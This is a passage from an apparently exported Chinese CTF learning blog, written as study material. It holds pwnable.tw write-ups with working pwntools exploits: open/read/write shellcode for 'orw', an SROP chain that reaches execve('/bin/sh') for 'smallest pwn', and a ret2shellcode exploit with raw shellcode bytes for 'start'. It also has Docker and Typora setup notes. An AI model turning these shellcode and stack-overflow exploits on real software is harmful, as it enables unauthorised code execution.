(2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程 copy的宋师傅的博客捏 ​ 所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。 ​ 参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下 123sys_open(&quot;flag&quot;)//读取flagsys_read(&quot;eax&quot;,&quot;esp&quot;,0x40)//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下sys_write(1,&quot;esp&quot;,0x40)//打印flag的值到屏幕输出 ​ 如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。 ​ 手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。 ​ 并且进行软中断时使用的指令是int 0x80而不是syscall，syscall是c语言层面上的系统调用，而int 0x80才是汇编层面的系统调用。 ​ 关于pwntools的asm模块，有一些比较怪的点。 ​ 比如说我们可以这样写： 123payload = asm(&quot;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;&quot;)也可以这样写 1asm(&#x27;mov eax, 0&#x27;) ​ 就是说，可以有分号，也可以没有。 1234567891011121314151617181920from pwn import*#p = process(&quot;./orw&quot;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)p = remote(&quot;chall.pwnable.tw&quot;,10001)#context.log_level = &quot;debug&quot;#openpayload = asm(&quot;push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;&quot;)#readpayload += asm(&quot;mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;&quot;)#writepayload += asm(&quot;mov eax, 0x4;mov ebx, 0x1;int 0x80;&quot;)#gdb.attach(p)p.sendline(payload)p.interactive() ​ 完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。 4）参考prctl函数开始学习沙箱规则](https://www.cnblogs.com/L0g4n-blog/p/12839171.html)","categories":[{"name":"STACK - sandbox","slug":"STACK-sandbox","permalink":"https://fuurinko.github.io/categories/STACK-sandbox/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwndocker的pwn题体验（下","slug":"mess_pwndocker的pwn题体验（下）","date":"2021-11-10T20:04:03.336Z","updated":"2022-04-09T08:39:23.762Z","comments":true,"path":"2021/11/11/mess_pwndocker的pwn题体验（下）/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/mess_pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","excerpt":"","text":"0）​ 哈哈，还是连续剧，我也想不到捏。我也不想捏。 1）问题​ pwndocker体验了快一周，目前来说主要问题有这几个： 启动tmux进行调试时机器发热严重，风扇狂转 挂载文件夹内文件不同步 快照的制作相对麻烦（时间久，步骤多） 打开需要输入命令，有点烦。 ​ 想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。 （看我的绝美终端） ​ 每天在ayanami的注视下打工也会变得快乐（不是打工） ​ 虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。 ​ 目前来说我只能应付。 3）解决方案？1​ 机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。 ​ 2021-11-14更新：这个问题突然就没有了（ 2​ 挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。 ​ 2021-11-14更新：这个问题突然就没有了（ 3​ 这个可以整个一件push脚本 ps：可以直接docker commit -p ，也算生成了快照，并且耗时比较短，就是有一点点没有安全感。 4​ 直接写shell脚本，然后放在默认路径下。 5123cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.sopatchelf --set-interpreter /tmp/ld-2.27.so ./testLD_PRELOAD=./libc.so.6 ./test 好东西","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"SROP学习","slug":"stack_learningsrop学习","date":"2021-11-07T11:11:19.208Z","updated":"2022-10-24T01:44:14.021Z","comments":true,"path":"2021/11/07/stack_learningsrop学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/07/stack_learningsrop%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1)前言​ 在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。 2）SROP原理​ 当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。 ​ 所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。 ​ 借一张图说明一下： 3）SROP利用​ pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。 funsignal​ 题目地址： funsignals ​ 打开题目，是手写汇编。 ​ ​ 观察一下。程序分别通过系统调用，调用了sys_read , sys_sigreturn两个函数。 ​ 那么很明显，sys_read用来栈溢出，然后 sys_sigreturn作为返回地址。并且flag的地址都已经给出，我们只需要通过sys_write读出flag的值就行。 ​ 所以我们需要构造sys_write的调用 123456frame = SigreturnFrame()frame.rax = constants.SYS_write#write函数的系统调用号frame.rdi = constants.STDOUT_FILENO#1frame.rsi = elf.symbols[&#x27;flag&#x27;]#0x010000023frame.rdx = 50#读取的字符数frame.rip = elf.symbols[&#x27;syscall&#x27;] ​ 这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用sys_read的时候把东西读进用户栈，然后接着调用 sys_sigreturn让内核将用户栈的东西恢复，就相当于调用了sys_write，从而读出flag的值。 ​ 但是这道题将我们需要的任何地址都给出了，甚至也不需要构造sys_sigreturn，我们通过另外一个例子来演示一下如何构造sys_sigreturn并且获得一个shell。 Smallest Pwn​ 题目：smallest pwn ​ 直接先在IDA中查看： 12345678910111213start proc near ; DATA XREF: LOAD:0000000000400018↑o.text:00000000004000B0 xor rax, rax.text:00000000004000B3 mov edx, 400h ; count.text:00000000004000B8 mov rsi, rsp ; buf.text:00000000004000BB mov rdi, rax ; fd.text:00000000004000BE syscall ; LINUX - sys_read.text:00000000004000C0 retn.text:00000000004000C0 start endp.text:00000000004000C0.text:00000000004000C0 _text ends.text:00000000004000C0.text:00000000004000C0.text:00000000004000C0 end start ctf-wiki题解​ 可以看到程序本身就是一个sys_read。所以我们需要利用它来getshell，难度可想而知。 ​ 由于题目只给出了sys_read，但是泄露程序内存我们肯定是需要一个sys_write 的，所以这里有一个trick，就是通过将sys_read的返回值构造成函数的系统调用号。然后调用sys_write以及sys_sigreturn。 ​ 那么来看详细的分析 ​ 首先需要调用sys_write，系统调用号为4，也就是需要sys_read返回读入四个字符，将rax的值赋为4。 ​ 顺便sys_sigreturn的返回值为119。 ​ 然后看exp： 123456789payload = p64(start_addr) * 3sh.send(payload)## modify the return addr to start_addr+3## so that skip the xor rax,rax; then the rax=1## get stack addrsh.send(&#x27;\\xb3&#x27;)stack_addr = u64(sh.recv()[8:16])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr)) ​ 首先发送三次start_addr，第一次使得程序执行流重新回到start，但是在重新执行时输入\\xb3 ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从0x4000B3开始。(第三个地址的作用会在后面体现) ​ 同时我们读入的\\xb3 ,仅有一个字节，这使得sys_read的返回值为1，存在rax中，程序在这里就相当于执行了 12345mov rax, 1mov edx, 400h ; countmov rsi, rsp ; bufmov rdi, rax ; fdsyscall ; LINUX - sys_write 所以此时相当于进行了一个系统调用号为1的系统调用,也就是sys_write函数。 ​ 并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。 ​ 回忆一下，srop的关键是通过sys_sigreturn来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。 1234567891011## make the rsp point to stack_addr## the frame is read(0,stack_addr,0x400)sigframe = SigreturnFrame()#创建一个SigreturnFrame，没啥好说的sigframe.rax = constants.SYS_read#确定我们希望调用的函数的系统调用号sigframe.rdi = 0#read参数sigframe.rsi = stack_addr#read参数，在栈上读入sigframe.rdx = 0x400#read参数，读多大sigframe.rsp = stack_addr#sigframe参数sigframe.rip = syscall_ret#sigframe参数，这里是syscall+retn的地址payload = p64(start_addr) + &#x27;a&#x27; * 8 + str(sigframe)sh.send(payload) ​ 接着我们开始构造sys_sigreturn 1234## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &#x27;b&#x27; * 7#读入15字节sh.send(sigreturn)#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15. ​ 这样我们就成功地调用了sys_sigreturn,此时我们已经可以向用户栈中读入任意数据了。 1234567891011121314## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120 # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &#x27;b&#x27; * 8 + str(sigframe)print len(frame_payload)payload = frame_payload + (0x120 - len(frame_payload)) * &#x27;\\x00&#x27; + &#x27;/bin/sh\\x00&#x27;sh.send(payload)sh.send(sigreturn) ​ 我们再次利用SigreturnFrame()来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用sys_sigreturn来触发。 ​ 所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用sys_write泄露栈地址，通过两次调用sys_sigreturn，第一次执行sys_read，将execute(&quot;/bin/sh&quot;)写入用户栈，第二次调用sys_sigreturn来getshell。 自己的反思​ 有一个疑惑，就是既然我们能够通过控制rax而控制syscall，而普通的sys_read也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？ ​ 怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的： 1234567891011121314151617181920212223reread = 0x4000b0syscall = 0x4000berereadaddr = p64(reread)syscalladdr = p64(syscall)context.clear()context.arch = &quot;amd64&quot;frame = SigreturnFrame()frame.rax = 59frame.rdi = 0x7fffffffe4e8frame.rip = syscallbinsh=&#x27;/bin/sh&#x27; playload1 = rereadaddr+&#x27;a&#x27;*8+ str(frame)+binshp.send(playload1)playload2 = syscalladdr+&#x27;a&#x27;*7p.send(playload2)#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/ ​ ​ 可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。 ​ 去查了一些资料，发现还是对于SigreturnFrame()的理解不够透彻。 ​ SigreturnFrame()中有一个非常重要的part：sigframe.rsp ​ 我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。 ​ 所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过sys_write ,来回跳转执行流。 4）总结​ 非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。 5）参考​ 2017 429 ichunqiu ctf smallest(pwn300) writeup SROP","categories":[{"name":"STACK - SROP","slug":"STACK-SROP","permalink":"https://fuurinko.github.io/categories/STACK-SROP/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"pwndocker的pwn题体验（上）","slug":"mess_pwndocker的pwn题体验（上）","date":"2021-11-02T14:54:29.012Z","updated":"2022-12-14T01:45:24.662Z","comments":true,"path":"2021/11/02/mess_pwndocker的pwn题体验（上）/","link":"","permalink":"https://fuurinko.github.io/2021/11/02/mess_pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","excerpt":"","text":"1）前言​ 之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。 2）pwndocker启动​ 首先是如何build pwndocker的问题。 ​ 如果直接docker pull pwndocker，速度一般会很慢。 ​ 这里参考一篇博客的做法：skysider/pwndocker 正确使用姿势。 ​ docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0从阿里云上拉取镜像，使得速度变快。 ​ 拉取完之后重命名镜像。docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker ​ 然后可以 123456789docker run -d \\--rm \\-h $&#123;ctf_name&#125; \\--name $&#123;ctf_name&#125; \\-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \\-p 23947:23947 \\--cap-add=SYS_PTRACE \\--privileged \\pwn10 ​ 运行镜像。 ​ 但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用 docker run -it skysider/pwndocker /bin/bash是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。 ​ ​ 我们可以先用docker cp来将题目的文件拷贝至容器中。 ​ ​ 关于docker cp指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。 ​ 如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过docker run指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过docker start和docker attach来进入容器就行。 ​ 愉快的gdb时间（（ ​ 还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。 ​ 然后是做题时间。 ​ 这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。 ​ ​ ps：关于cyclic的原理可以看我的pwntools源码解析系列。 ​ 然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。 ​ 还是要借助docker run的- v参数，大概就是~/work/pwner:/ctf/work ​ 但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？ ​ 后来重启一次之后就能立即同步到容器中了。好。 ​ 有一点离谱。 ​ 虽然但是，我超，pwndokcer真的好用。 ​ 鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（ ​ 所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。 ​ 然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。 ​ shellcode就没必要手写了，pwntools.shallcraft直接生成。 12345678910from pwn import*p = remote(&#x27;chall.pwnable.tw&#x27;,10000)shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*20payload += shellcodep.send(payload)p.interactive() ​ 摸了一圈，又EOF力。 ​ 换了祖传exp。 123456789101112131415161718192021222324from pwn import*p = remote(&quot;chall.pwnable.tw&quot;,10000)#p = process(&quot;./start&quot;)#shellcode = asm(shellcraft.sh())shellcode = b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;buf_addr = 0xffffd284payload = b&#x27;a&#x27;*0x14 payload += p32(0x8048087)p.sendafter(&quot;Let&#x27;s start the CTF:&quot;,payload)stack_addr = u32(p.recv(4))print(hex(stack_addr))payload = b&#x27;a&#x27;*20payload += p32(stack_addr+20)payload += shellcodep.send(payload)p.interactive() ​ 所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。 ​ shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。 ​ 在调试的时候又出现了新问题。 ​ 搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。 ​ 在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。 ​ 这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。 ​ 虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。 ​ 这里留个疑点吧。 ​ 还是回到题目本身。也就是无法gdb.attach()的问题。 ​ 原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。 ​ 我傻了。坑是真的多。 ​ 果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。 ​ 在修改源码后解决问题，详情可以参考：pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案。 ​ 解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。 ​ 百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。 ​ 对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。 ​ ​ ​ 尝试了一下一种新的下断点方式。 ​ 回到题目，很显然如果摁执行shellcode，就根本没有反应（（ ​ eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。 ​ 新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。 ​ 好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的） ​ 这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后 ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。 ​ (真有够麻烦的) 3）漏洞利用 ​ 看一下发现不对头，这个返回地址是我们的shellcode。 ​ 按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。 ​ 然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。 ​ 那么我们要retn到哪里呢？ ​ 既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。 ​ 既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用sys_write 对栈上内存进行一个读取。 ​ 那么如何利用捏。 ​ 从这里我们可以清楚地看到，这几条指令分别设置了sys_write的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。 ​ mov ecx, esp将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。 ​ ![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png) ​ 其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。 ​ 当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。 ​ 这时候程序还是会按照原有的指令执行，比如说下一个sys_read函数。 ​ 这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，sys_read会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20） ​ 然后直接溢出到栈地址。 ​ 执行shellcode ​ hhx 4）总结​ 这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。 ​ 动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！ ​ 另外容器要记得及时备份55. ​ 还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。 ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"基于ctf pwn环境的docker搭建","slug":"mess_基于ctf pwn环境的docker配置","date":"2021-10-31T15:04:01.604Z","updated":"2022-04-09T08:36:33.463Z","comments":true,"path":"2021/10/31/mess_基于ctf pwn环境的docker配置/","link":"","permalink":"https://fuurinko.github.io/2021/10/31/mess_%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","excerpt":"","text":"​ 最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架，但我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。 docker基础架构​ 对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。 1.1 为什么要有docker？​ 一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。 ​ 为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。 ​ 但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。 ​ linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。 ​ 而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 1.2 docker基础知识​ 之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。 ​ image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。 1.3 docker基础命令​ 首先我们需要拉取镜像至本地，可以通过docker pull命令。例如： 1$ docker image pull library/hello-world ​ ​ 拉取镜像需要一定时间的等待，拉取完成后，通过docker image ls可以查看本地的docker镜像。 ​ ​ 这个hello world其实就是被打包好的在特定环境下的程序，我们可以通过docker cantainer run hello-world指令将镜像创建为容器并运行。 docker build​ build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是 1$ docker build -t imagename . ​ 虽然我不是很理解这个-t 的参数意义何在，并且镜像名后面的“.”是干啥的。 docker run​ 创建一个新的容器并运行 ​ 一般来说会有这几个参数 123456789-d: 后台运行容器，并返回容器ID；-it: 以交互模式运行容器，并创建一个伪终端；-p: 指定端口映射，格式为：主机(宿主)端口:容器端口--name=&quot;nginx-lb&quot;: 为容器指定一个名称；-v：映射主机文件夹至容器内 docker start/stop/retart​ 启动或停止容器。 ​ 指令为docker start/stop/retart containerID docker pause​ 暂停容器内全部进程。 docker kill​ kill 运行的容器进程 docker ps​ 列出容器。 1-a :显示所有的容器，包括未运行的。 docker attach​ 连接到正在运行中的容器。 docker attach containerID docker inspect​ 获取容器/镜像的元数据。 简单的docker搭建步骤​ 熟悉docker基础操作后，开始搭建docker啦！！ ​ 首先是脚本的选择，pwn的docker脚本其实很多，这里随便选一个最基础的ctf_xinted。 ​ 首先我们需要做的是把项目clone到本地。 ​ 通过指令cat Dockerfile可以看到dockerfile。 ​ dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到ctf_xinetd的文件夹下，然后执行 1sudo docker build -t &quot;helloworld&quot; . ​ (注意后面的“.”) ​ 这个时候一般就会创建helloworld这个镜像，我们只需要等待创建结束，然后执行 1sudo docker run -d -p &quot;0.0.0.0:10001:9999&quot; -h &quot;helloworld&quot; --name=&quot;helloworld&quot; helloworld ​ 0.0.0.0表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。 ​ 如果运行正常，此时我们是能够通过 nc 0.0.0.0 10001来连接我们的docker容器的。 ​ 但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样 1sudo service docker restart ​ 这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。 ​ 但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。 ​ 所以我们可以更换另外一个脚本进行docker镜像的创建。 ​ 这里我们选择https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。 ​ 然后有个比较全面的教程，链接在这里：如何安全快速地部署多道ctf%20pwn比赛题目 ​ 就是把文件放到bin文件夹，然后 12python initialize.pydocker-compose up --build -d # please run as root ​ 这样就生成了一个总的镜像，每道题通过不同端口映射，然后分别有各自的flag。 ​ 在完成镜像的创建后，还需要在做题平台中填写相关镜像。 ​ 因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。 ​ 然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。 ​ 直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。 ​ 然后又狠狠地push了镜像，在CTFd填了镜像的名字，然后端口就是初始化时每个二进制文件对应的那个映射的端口，这下总算靶机ready了。并且顺利通过测试。 ​ 好！ ​ ​ ​ 参考Docker 入门教程 Docker 镜像使用 ​ ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"typora主题配置的一些心得","slug":"mess_typora主题配置的一些心得","date":"2021-10-29T15:20:57.419Z","updated":"2022-03-20T04:33:08.595Z","comments":true,"path":"2021/10/29/mess_typora主题配置的一些心得/","link":"","permalink":"https://fuurinko.github.io/2021/10/29/mess_typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"1）​ 由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。 2）​ 在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。 ​ 这里以主题mint为例，css中:root元素声明了全局css变量，如下： 123456789101112 :root &#123; --side-bar-bg-color: #ffffff;//边栏颜色 --control-text-color: #6B6B6B;//边栏文件未选中字体颜色 --active-file-bg-color: #ecf6f2;//边栏文件背景颜色 --active-file-border-color: #6B6B6B;//不清楚是个啥 --active-file-text-color: #202020;//边栏文件选中后字体颜色 --table-even-row-color:#f8fcfa;//不清楚是个啥 --table-head-color:#d9ede5;//不清楚是个啥 --deep-theme-color: #c2e2d5;//深色模式主题色 --code-block-bg-color: #0F111A;//代码块字体颜色以及代码块边框颜色 &#125; ​ 所以如果想修改各种配色，只需要修改对应颜色的hex就行。 ​ 这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（ ​ 然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用highlight.js（感觉也差不多233）。 ​ 